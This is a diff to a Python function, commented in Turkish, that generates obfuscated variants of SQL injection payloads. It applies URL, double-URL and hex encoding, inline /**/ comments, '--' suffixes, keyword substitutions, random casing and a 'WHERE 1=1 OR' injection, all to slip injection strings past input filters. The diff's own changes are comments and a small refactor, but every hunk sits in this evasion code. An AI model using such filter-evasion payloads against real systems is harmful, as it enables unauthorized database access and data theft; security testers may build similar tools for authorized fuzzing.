@@ -5,6 +5,7 @@ import logging
 def obfuscate_payloads(payload):
     """
     SQL enjeksiyon ifadelerini gizlemek için çeşitli yöntemler uygular.
+    Döndürülen liste, farklı gizleme yöntemlerini içeren payload'lardan oluşur.
     """
     if not payload or not isinstance(payload, str):
         logging.error("Geçersiz payload verisi.")
@@ -14,7 +15,7 @@ def obfuscate_payloads(payload):
     obfuscations = [
         urllib.parse.quote(payload),  # URL encoding
         "".join([f"%{hex(ord(c))[2:]}" for c in payload]),  # ASCII kodlama
-        "||".join(payload.split(" ")),  # '||' kullanarak bölme
+        "||".join(payload.split(" ")),  # '||' karakteriyle bölme
         payload.replace(" ", "/**/"),  # '/*...*/' kullanarak bölme
         payload + "--",  # SQL yorum satırı ekleme
         "/**/".join(payload.split(" ")),  # SQL yorumlu bölme
@@ -42,8 +43,7 @@ def obfuscate_payloads(payload):
     for keyword, obf_versions in sql_keywords.items():
         if keyword in payload.upper():
             for obf_version in obf_versions:
-                obfuscated_payload = payload.upper().replace(keyword, obf_version)
-                obfuscations.append(obfuscated_payload)
+                obfuscations.append(payload.upper().replace(keyword, obf_version))
 
     # Ek gizleme teknikleri
     mixed_case_payload = "".join(
@@ -57,10 +57,12 @@ def obfuscate_payloads(payload):
     sql_comment_payload = "".join(f"{char}--" if random.choice([True, False]) else char for char in payload)
     obfuscations.append(sql_comment_payload)
 
+    # WHERE ifadesi varsa injection ekleme
     if "WHERE" in payload.upper():
         injection_payload = payload.replace("WHERE", "WHERE 1=1 OR")
         obfuscations.append(injection_payload)
 
+    # Çift kodlama ve tersine çevirme eklenir
     double_encoding = urllib.parse.quote(urllib.parse.quote(payload))
     obfuscations.append(double_encoding)
 
